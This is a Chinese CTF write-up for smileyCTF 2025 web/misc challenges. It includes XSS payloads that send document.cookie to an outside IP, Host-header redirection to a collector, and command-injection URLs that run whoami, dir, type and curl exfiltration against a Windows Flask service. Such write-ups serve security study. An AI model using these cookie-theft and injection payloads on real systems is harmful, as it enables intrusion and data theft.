+++
title = "smileyCTF2025"
slug = "smileyctf2025"
description = "鸡哥骂我呜呜"
date = "2025-06-14T16:05:06"
lastmod = "2025-06-14T16:05:06"
image = ""
license = ""
categories = ["赛题"]
tags = ["xss"]
+++

## web/Sculpture Revenge

访问用户提供的url，并且还必须是同域名的情况

```python

"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

parsed = urlparse("https://google.com")
query_params = parse_qs(parsed.query)
query_params["code"] = "123"
new_query = urlencode(query_params, doseq=True)
new_url = urlunparse(parsed._replace(query=new_query))

"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from flask import Flask, request, make_response, redirect
import base64, sys

from selenium import webdriver
from selenium.webdriver.chrome.options import Options

flag = open('flag.txt').read().strip()
app = Flask(__name__)

PORT = 8802


@app.route('/')
def index():
    return make_response(open('index.html').read())

@app.route('/bot', methods=['GET'])
def bot():
    data = request.args.get('code', '🍃').encode('utf-8')
    data = base64.b64decode(data).decode('utf-8')
    parsed = urlparse(f"{request.host_url}")
    query_params = parse_qs(parsed.query)
    query_params["code"] = base64.b64encode(data.encode('utf-8')).decode('utf-8')
    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=options)
    driver.get(f'{request.host_url}void')
    driver.add_cookie({
        'name': 'flag',
        'value': flag.replace(".;,;.{", "").replace("}", ""),
        'path': '/',
    })
    print('[+] Visiting ' + new_url, file=sys.stderr)
    driver.get(new_url)
    driver.implicitly_wait(5)
    driver.quit()
    print('[-] Done visiting URL', new_url, file=sys.stderr)
    return make_response('Bot executed successfully', 200)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
```

在Skulpt环境中执行提交的经过base64编码的python代码，同时发现真正的flag，并没有域名限制的访问，

```python
print "1"
```

这样子测试是成功的，对于这个解析器，好像有个payload可以使用

```python
print('<img src="x" onerror="alert(114)">')
```

但是并没有成功，`index.html`写到是纯文本，还是自己起docker来测试一下了

```yml
version: '3.8'

services:
  sculpture-revenge:
    build: .
    ports:
      - "8802:8802"
    volumes:
      - ./flag.txt:/app/flag.txt
      - ./app.py:/app/app.py
      - ./index.html:/app/index.html
    environment:
      - PYTHONDONTWRITEBYTECODE=1
      - PYTHONUNBUFFERED=1
    restart: unless-stopped
```

A5rZ师傅之前研究过类似的东西，说`parsed = urlparse(f"{request.host_url}")`其实是取决于host头，也就是可控的，当我们本地测试的时候确实work

```http
GET /?code=dHh1ZDRyY2lxZDhpbG5tbmJhMGh5NWk5dzAycnFnLm9hc3RpZnkuY29t HTTP/1.1
Host: txud4rciqd8ilnmnba0hy5i9w02rqg.oastify.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: keep-alive


```

即可收到flag，但是远程并不成功，后来询问师傅得知可以使用document去创建一个在线的标签

```python
import document

img = document.createElement("img")
img.setAttribute("src", "x")
img.setAttribute("onerror", "fetch('http://156.238.233.93:9999/' + document.cookie)")
document.getElementById("output").appendChild(img)
```

本地成功远程不成功，可能是跨域的问题，换成

```python
import document

img = document.createElement("img")
img.setAttribute("src", "x")
img.setAttribute("onerror", "window.location.href('http://156.238.233.93:9999/' + document.cookie)")
document.getElementById("output").appendChild(img)
```

## misc/TI-1983

反而我认为这题更像是web，来看看简单的代码吧

```python
from flask import Flask, request, send_file
import subprocess
import tempfile
import os
app = Flask(__name__, static_folder=None)
code_tmpl = open("code_tmpl.py").read()
@app.route('/')
def index():
    return open("static/index.html", "rb").read().decode()

@app.route('/static')
def fileserve():
    url = request.url
    fpath = url.split(f"static?")[-1]
    files = os.listdir("static")
    if fpath not in files or not fpath.endswith(".tmpl"):
        fpath = "🐈.tmpl"
    return send_file(f"static/{fpath}")

def render_error(msg):
    return open("static/error.html", "rb").read().decode().replace("{{msg}}", msg)

@app.route('/ti-84')
def execute_code():
    code = request.values.get('code')
    output_tmpl = request.values.get('tmpl')
    if len(code) > 3 and any(c in code for c in "0123456789+*-/"):
        return render_error("This is a ~~Wendys~~ TI-84.")
    tmpl = code_tmpl
    tmplcode = tmpl.replace("{{code}}", code)
    tmpfile = tempfile.NamedTemporaryFile(suffix=".py", delete=False)
    tmpfile.write(tmplcode.encode())
    tmpfile.flush()
    url = f"{request.url_root}/static?{output_tmpl}.tmpl"
    if sum(1 for c in url if ord(c) > 127) > 1:
        return render_error("too many emojis... chill with the brainrot")
    out_tmpl = os.popen(f"curl.exe -s {url}").read()
    if "{{out}}" not in out_tmpl:
        return render_error("Template must have {{out}}")
    tmpfile.close()
    result = subprocess.run(['python.exe', tmpfile.name], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout
    if os.path.exists(tmpfile.name):
        os.remove(tmpfile.name)
    return out_tmpl.replace("{{out}}", result)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=False)
```

这里给了一个简单的flask服务，其中有模版替换之后进行渲染，然后本地访问进行测试等操作，我们可以很敏锐的发现两个漏洞，一个是命令拼接直接RCE

```python
    out_tmpl = os.popen(f"curl.exe -s {url}").read()
```

本地测试一下发现`&`为分隔符

```python
import os

a=os.popen(f"whoami& whoami > static/1.txt").read()
print(a)
```

一个是SSTI

```python
from RestrictedPython import compile_restricted
code = """
{{code}}
"""

byte_code = compile_restricted(code, '<inline>', 'eval')

print(eval(byte_code, {'__builtins__': {}}, {'__builtins__': {}}))


```

省去了平时的`{{}}`但是这里限制了模块，所以绕过进行RCE成为了几乎不可能的事情，再本地开启应用进行测试可以知道确实能够RCE的

```
http://127.0.0.1/ti-84?code=1&tmpl=index.tmpl%26whoami > static/2.txt%26index


http://127.0.0.1/ti-84?code=1&tmpl=index.tmpl%26curl https://epkveh22.requestrepo.com/%26index


http://127.0.0.1/ti-84?code=1&tmpl=index.tmpl%26curl https://epkveh22.requestrepo.com/`whoami`%26index
```

看Dockerfile也看得出来是Windows主机，

```dockerfile
FROM mcr.microsoft.com/windows/servercore:ltsc2022

LABEL Description="Python" Vendor="Python Software Foundation" Version="3.10.0"

RUN powershell.exe -Command \
    $ErrorActionPreference = 'Stop'; \
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \
    wget https://www.python.org/ftp/python/3.10.0/python-3.10.0.exe -OutFile c:\python-3.10.0.exe ; \
    Start-Process c:\python-3.10.0.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait ; \
    Remove-Item c:\python-3.10.0.exe -Force


RUN powershell.exe -Command \
    $ErrorActionPreference = 'Stop'; \
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \
    wget https://curl.se/windows/dl-8.14.1_1/curl-8.14.1_1-win64-mingw.zip -OutFile c:\curl.zip ; \
    Expand-Archive c:\curl.zip -DestinationPath C:\curl ; \
    Remove-Item c:\curl.zip -Force

COPY requirements.txt /app/requirements.txt
COPY server.py /app/server.py
COPY flag.txt /app/flag.txt
COPY static /app/static/
COPY code_tmpl.py /app/code_tmpl.py
RUN move C:\curl\curl-8.14.1_1-win64-mingw\bin\curl.exe C:\app\curl.exe
WORKDIR /app
RUN ["python", "-c", "import os; os.rename('flag.txt', f'flag_{os.urandom(8).hex()}.txt')"]
RUN ["pip", "install", "-r", "requirements.txt"]
RUN net user /add chall
USER chall
EXPOSE 80
ENTRYPOINT ["python", "-X", "utf8", "server.py"]
```

所以我们外带这里反引号不会识别成功，直接命令执行即可

```
https://misc-ti-1983-qmr42v1n.windows.smiley.cat/ti-84?code=1&tmpl=index.tmpl%26dir%26index

https://misc-ti-1983-qmr42v1n.windows.smiley.cat/ti-84?code=1&tmpl=index.tmpl%26type flag_4dfa54cf005d9fea.txt%26index
```

## misc/TI-1984

https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/

what can i say，找不到可以利用的curl的参数，

https://hackerone.com/reports/2550951

和上题不同的地方就是

```python
subprocess.run(['curl.exe', '-s', url], stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.decode()
```



```
index.tmpl%EF%BC%82%20-s%20file:///app/%20%EF%BC%82index

index.tmpl%26dir%26index
```

没成功最后，等待复现
